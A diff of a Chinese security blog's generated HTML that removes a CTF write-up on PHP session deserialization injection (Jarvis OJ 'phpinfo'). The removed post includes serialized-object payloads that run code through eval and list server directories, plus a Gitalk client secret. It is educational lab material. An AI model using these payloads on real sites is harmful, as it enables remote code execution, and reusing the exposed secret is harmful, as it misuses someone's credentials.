@@ -6,24 +6,15 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>PHP session 反序列化 | gml&#39;s blog</title>
+  <title>Archives: 2019/10 | gml&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Sessionsession就是服务器为用户浏览器创建的一个保存用户信息的文件存储的文件是以sess_sessionid来进行命名的，文件的内容就是session值的序列化之后的内容。session序列化与反序列化有三种方式：">
-<meta name="keywords" content="CTF,Web,PHP">
-<meta property="og:type" content="article">
-<meta property="og:title" content="PHP session 反序列化">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2018&#x2F;10&#x2F;03&#x2F;PHPsession&#x2F;index.html">
+  <meta name="keywords" content="gml,博客">
+<meta property="og:type" content="website">
+<meta property="og:title" content="gml&#39;s blog">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;archives&#x2F;2019&#x2F;10&#x2F;index.html">
 <meta property="og:site_name" content="gml&#39;s blog">
-<meta property="og:description" content="Sessionsession就是服务器为用户浏览器创建的一个保存用户信息的文件存储的文件是以sess_sessionid来进行命名的，文件的内容就是session值的序列化之后的内容。session序列化与反序列化有三种方式：">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2018&#x2F;10&#x2F;03&#x2F;PHPsession&#x2F;picture1.jpg">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2018&#x2F;10&#x2F;03&#x2F;PHPsession&#x2F;picture2.jpg">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2018&#x2F;10&#x2F;03&#x2F;PHPsession&#x2F;picture3.jpg">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2018&#x2F;10&#x2F;03&#x2F;PHPsession&#x2F;picture4.jpg">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2018&#x2F;10&#x2F;03&#x2F;PHPsession&#x2F;picture5.jpg">
-<meta property="og:updated_time" content="2019-10-28T17:09:19.212Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2018&#x2F;10&#x2F;03&#x2F;PHPsession&#x2F;picture1.jpg">
   
     <link rel="alternative" href="/atom.xml" title="gml&#39;s blog" type="application/atom+xml">
   
@@ -164,289 +155,50 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-PHPsession" class="article article-type-post " itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
+            
   
-    <h1 class="article-title" itemprop="name">
-      PHP session 反序列化
+  
+    
+    
+      
+      
+      <section class="archives-wrap">
+        <div class="archive-year-wrap">
+          <a href="/archives/2019" class="archive-year">2019</a>
+        </div>
+        <div class="archives">
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      	<div class="article-meta">
+	      	<a href="/2019/10/29/weiphp5-0-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="archive-article-date">
+  	<time datetime="2019-10-29T07:23:59.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-29</time>
+</a>
+        </div>
+    	 
+  
+    <h1 itemprop="name">
+      <a class="archive-article-title" href="/2019/10/29/weiphp5-0-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">weiphp5.0-漏洞复现</a>
     </h1>
   
 
-        
-        <a href="/2018/10/03/PHPsession/" class="archive-article-date">
-  	<time datetime="2018-10-03T06:32:47.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-03</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h4 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h4><p>session就是服务器为用户浏览器创建的一个保存用户信息的文件<br>存储的文件是以sess_sessionid来进行命名的，文件的内容就是session值的序列化之后的内容。<br>session序列化与反序列化有三种方式：</p>
-<a id="more"></a>
+        <div class="article-info info-on-right">
+          
+          
 
-<hr>
-<p><img src="picture1.jpg" alt="image"></p>
-<p>php只是比php_serialize序列化多出了一个键名 ＋ 竖线 ，键名可以是空的，可以注入。  </p>
-<h4 id="Jarvis-OJ-phpinfo"><a href="#Jarvis-OJ-phpinfo" class="headerlink" title="Jarvis OJ phpinfo"></a>Jarvis OJ phpinfo</h4><blockquote>
-<p>看这道jarvios oj 的题：</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(<span class="string">'index.php'</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>分析题目 肯定是要通过反序列化出来OowoO这个对象，把mdzz这个变量改成我们需要执行的命令。  </p>
-<p>利用的是php的session解析不同导致的注入 ，用serialize方法序列化结果前面加个|  就是php_serialize解析的对象。<br>此题也没有传session的方法，参考帖子得知利用Session Upload Progress上传个文件,filename就可以作为session的值。  </p>
-<p>首先我们要本地搭建环境，拿到我们想要的序列化值，代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'echo "hacker";'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> OowoO();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>得到结果：O:5:”OowoO”:1:{s:4:”mdzz”;s:14:”echo “hacker”;”;}<br>注意这里不能把这个直接传过去，利用解析引擎不同 要在前面加个| （引号要转义）<br>也就是说 传进去的filename:|O:5:\“OowoO\“:1:{s:4:\“mdzz\“;s:14:\“echo \“hacker\“;\“;}</p>
-<p>新建一个html:</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://web.jarvisoj.com:32784/"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"123"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>上传文件burp抓包,把filename改为上面的payload：<br><img src="picture2.jpg" alt="image"><br>执行成功  </p>
-<p>看一下根目录：<br>|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:35:&quot;print_r($_SERVER[&quot;DOCUMENT_ROOT&quot;]);&quot;;}  </p>
-<p><img src="picture3.jpg" alt="image"></p>
-<p>进去看看有什么：<br>|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:39:&quot;print_r(scandir(‘/opt/lampp/htdocs/‘));&quot;;}  </p>
-<p><img src="picture4.jpg" alt="image"><br>  读flag:<br><img src="picture5.jpg" alt="image"></p>
-<p>参考:  <br><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/" target="_blank" rel="noopener">https://blog.spoock.com/2016/10/16/php-serialize-problem/</a></p>
-<p><a href="https://blog.csdn.net/qq_35078631/article/details/77284684" target="_blank" rel="noopener">https://blog.csdn.net/qq_35078631/article/details/77284684</a></p>
-
-      
-
-      
-        <div class="page-reward">
-          <a href="javascript:;" class="page-reward-btn tooltip-top">
-            <div class="tooltip tooltip-east">
-            <span class="tooltip-item">
-              赏
-            </span>
-            <span class="tooltip-content">
-              <span class="tooltip-text">
-                <span class="tooltip-inner">
-                  <p class="reward-p"><i class="icon icon-quo-left"></i><i class="icon icon-quo-right"></i></p>
-                  <div class="reward-box">
-                    
-                    
-                  </div>
-                </span>
-              </span>
-            </span>
-          </div>
-          </a>
         </div>
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">PHP</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/CTF//" class="article-tag-list-link color4">CTF</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/CTF/Web//" class="article-tag-list-link color4">Web</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/CTF/Web/PHP//" class="article-tag-list-link color4">PHP</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-
-      
-        
-<div class="share-btn share-icons tooltip-left">
-  <div class="tooltip tooltip-east">
-    <span class="tooltip-item">
-      <a href="javascript:;" class="share-sns share-outer">
-        <i class="icon icon-share"></i>
-      </a>
-    </span>
-    <span class="tooltip-content">
-      <div class="share-wrap">
-        <div class="share-icons">
-          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
-            <i class="icon icon-weibo"></i>
-          </a>
-          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
-            <i class="icon icon-weixin"></i>
-          </a>
-          <a class="qq share-sns" href="javascript:;" data-type="qq">
-            <i class="icon icon-qq"></i>
-          </a>
-          <a class="douban share-sns" href="javascript:;" data-type="douban">
-            <i class="icon icon-douban"></i>
-          </a>
-          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
-            <i class="icon icon-qzone"></i>
-          </a>
-          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
-            <i class="icon icon-facebook"></i>
-          </a>
-          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
-            <i class="icon icon-twitter"></i>
-          </a>
-          <a class="google share-sns" href="javascript:;" data-type="google">
-            <i class="icon icon-google"></i>
-          </a>
-        </div>
-      </div>
-    </span>
-  </div>
-</div>
-
-<div class="page-modal wx-share js-wx-box">
-    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <div class="wx-qrcode">
-      <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAAByUlEQVR42u3ay2rDQAwF0Pz/T6fQVaHYvpJsNYUzq5AMmWMvhB7zesXr/b1+f072vH+so29uXri4uGPu+3Qlx5/Tz9G5ARcXd5+bBKbkYY725/QLGy4u7odxJ4lRkgbh4uL+R25y/PmeSUGFi4u7z02SmDxxyf/twVoNFxd3wJ00TO/6vNTfxcXFHU8lqs3TZOfodFxc3BVu0rzIy5UkiZnsx8XF3eHOx6W9qxXJr4chDBcXd5FbTWWqQ9nk+4uQh4uLu8Itbz0NOvNhahQQcXFx/4ibX7SaXMuoXvDCxcXd5JaLkHH4y6ckN7wDXFzcIrc3CKm2U+eNElxc3E3uXXceeq3VvOwpPAwuLu6Y2ytyeqPTSUMEFxd3n5u3QpIje+OZqP2Ki4u7wq22Kav9lSo3GtXg4uI+zO1dkpjXW+dnHf4PLi7uIve5zmQ1bEWBDBcXd4VbPXhyIaPaNGm+IVxc3AG3GlBG7c54KJuPdXFxcZ/jThqdvTFJXmIddnFwcXFXuPN0JE+MHkxfcHFx17nVBkfvwS5eDS4u7kdyk9FsDxQlT7i4uIvc6iAkvzaRjFqT0ImLi7vJ7VUcSSGUXNpI9uPi4i5yvwBd+E3Ux4q6eQAAAABJRU5ErkJggg==" alt="微信分享二维码">
-    </div>
-</div>
-
-<div class="mask js-mask"></div>
-      
-      <div class="clearfix"></div>
-    </div>
+        <div class="clearfix"></div>
+    </header>
   </div>
 </article>
-
-  
-<nav id="article-nav">
-  
-    <a href="/2018/10/05/2018CSAW/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          2018 CSAW
-        
-      </div>
-    </a>
   
   
-</nav>
-
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-        <div class="toc-container tooltip-left">
-            <i class="icon-font icon-category"></i>
-            <div class="tooltip tooltip-east">
-                <span class="tooltip-item">
-                </span>
-                <span class="tooltip-content">
-                    <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#Session"><span class="toc-number">1.</span> <span class="toc-text">Session</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Jarvis-OJ-phpinfo"><span class="toc-number">2.</span> <span class="toc-text">Jarvis OJ phpinfo</span></a></li></ol>
-                    </div>
-                </span>
-            </div>
-        </div>
-        
-    </div>
-</aside>
-
-
-
-  
-  
+    </div></section>
   
 
-  
+    
 
-  
-
-  
-
-<!--显示阅读次数-->
-
-  <br/>
-  <a class="cloud-tie-join-count" href="javascript:void(0);" style="color:gray;font-size:14px;">
-  <span class="icon-sort"></span>
-  <span id="busuanzi_container_page_pv" style="color:#ef7522;font-size:14px;">
-            阅读数: <span id="busuanzi_value_page_pv"></span>次 &nbsp;&nbsp;
-  </span>
-  </a>
-
-<!--显示阅读次数完毕-->
-
-  <div id="gitalk-container" style="padding: 0px 30px 0px 30px;"></div> 
-
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
-<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
-<script type="text/javascript">
-
-if(true){
-  var gitalk = new Gitalk({
-    clientID: 'c741c580e5927006c62d',
-    clientSecret: 'f8fdc39531f526b87dac59d9f025c55cb9580617',
-    repo: 'happygml.github.io',
-    owner: 'happygml',
-    admin: ['happygml'],
-    id: 'Wed Oct 03 2018 14:32:47 GMT+0800',
-    distractionFreeMode: 'true'
-})
-gitalk.render('gitalk-container') 
-}
-</script>
-
-  
-
-<!--简书外链-->
-<script>
-var link = "" ;
-// 遍历所有的img标签
-$("img").each( (i,o) => {
-	
-	var o = $(o);
-	alert(o.attr("src"));
-    // 判断图片的链接是否包含sinaimg关键字
-	if( o.attr("src").indexOf("jianshu") > 0 ){
-	
-        // 给这个标签加上referrerPlicy属性
-		o.attr("referrerpolicy","no-referrer");
-        // 备份图片的src
-		link = o.attr("src");
-        // 重新设置src，让页面重新加载一次图片
-		o.attr("src",link);
-	}
-});
-</script>
 
           </div>
         </div>
@@ -468,8 +220,8 @@ $("img").each( (i,o) => {
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: true,
-		isArchive: false,
+		isPost: false,
+		isArchive: true,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
